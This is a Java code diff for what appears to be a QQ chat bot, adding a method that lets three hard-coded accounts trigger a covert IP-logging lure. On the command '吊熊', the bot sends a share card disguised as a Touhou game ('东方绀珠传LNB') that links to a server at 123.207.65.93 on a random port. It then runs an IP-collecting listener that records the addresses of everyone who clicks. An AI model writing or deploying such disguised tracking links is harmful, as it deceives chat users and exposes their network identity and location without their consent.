@@ -19,16 +19,14 @@ import org.jsoup.Jsoup;
 import com.meng.bilibili.LiveManager;
 import com.meng.lookGroup.IPGetter;
 
+import diaoXiongJiHua.XiongIPGetter;
+
 public class Methods {
 	private static String motmp = "";
 	private static String meng2tmp = "";
 	private static String[] pop = "11|12|60|63|96|107|110|114|117|128|129|151|159|123|268|208|248|5|20|28|37|45|212|178|62|44|90|107|119|114|125|142|168|185|1|2|3|4|5|6|7|8|9"
 			.split("\\|");
-	public static final String helpMenu = "发送“赞我”可收到10次赞.二维码生成与识别，发送“二维码帮助”可获得使用方法."
-			+ "图片搜索，发送“sp.help”可获得使用方法.窥屏检测,群内发送“窥屏检测”然后稍等片刻. 哔哩哔哩链接详情，群内发送一个哔哩哔哩视频链接或专栏链接即可触发."
-			+ "苟利……(不解释，，，)。此生无悔……（，，）.roll，发送“roll.help”可获得使用方法."
-			+ "催更，发送“xx今天更了吗”即可触发，需要在配置文件中有这位up的信息. 复读和根据词库相应消息（不解释，，，）" + "“查看统计”可以查看自己的发言统计，“查看排行”可以查看各统计排行";
-	static int arrayFlag = new java.util.Random().nextInt(5000);
+//	static int arrayFlag = new java.util.Random().nextInt(5000);
 
 	// 主开关
 	public static boolean checkSwitch(long fromGroup, String msg) {
@@ -263,6 +261,36 @@ public class Methods {
 				}
 			}, 20000);
 			return true;
+		}
+		return false;
+	}
+
+	public static boolean checkXiong(long fromQQ, String msg) {
+		if (fromQQ == 3291680841L || fromQQ == 2842589457L || fromQQ == 2856986197L) {
+			if (msg.equals("吊熊")) {
+				int port = Autoreply.instence.random.nextInt(5000);
+				Autoreply.sendMessage(0, fromQQ, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000),
+						"东方绀珠传LNB", "东方绀珠传LNB", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
+				final XiongIPGetter ipGetter = new XiongIPGetter(fromQQ, port);
+				ipGetter.start();
+				Timer timer = new Timer();
+				timer.schedule(new TimerTask() {
+					public void run() {
+						// Autoreply.sendMessage(ipGetter.fromGroup, 0, "当前有" +
+						// ipGetter.hSet.size() + "个小伙伴看了群聊");
+						ipGetter.running = false;
+					}
+				}, 200000);
+				return true;
+			}
+			if (msg.equals("吊熊2")) {
+				int port = Autoreply.instence.random.nextInt(5000);
+				Autoreply.sendMessage(0, fromQQ, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000),
+						"东方绀珠传LNB", "东方绀珠传LNB", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
+				final XiongIPGetter ipGetter = new XiongIPGetter(fromQQ, port);
+				ipGetter.start();
+				return true;
+			}
 		}
 		return false;
 	}
